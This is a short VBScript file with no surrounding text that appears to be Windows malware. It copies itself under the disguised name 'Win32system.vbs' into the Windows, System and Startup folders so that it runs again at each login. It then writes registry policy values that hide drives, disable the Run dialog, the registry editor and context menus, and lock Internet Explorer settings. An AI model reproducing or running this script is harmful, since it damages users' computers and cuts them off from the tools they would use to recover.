   On Error Resume Next
   Set fs=CreateObject("Scripting.FileSystemObject")
   Set dir1=fs.GetSpecialFolder(0)
   Set dir2=fs.GetSpecialFolder(1)
   Set so=CreateObject("Scripting.FileSystemObject")
   dim r
   Set r=CreateObject("Wscript.Shell")
   so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Win32system.vbs")
   so.GetFile(WScript.ScriptFullName).Copy(dir2&"\Win32system.vbs")
   so.GetFile(WScript.ScriptFullName).Copy(dir1&"\Start Menu\Programs\Æô¶¯\Win32system.vbs")
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives",63000000,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\WinOldApp\Disabled",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewContextMenu",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoSetFolders",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"
   r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD"
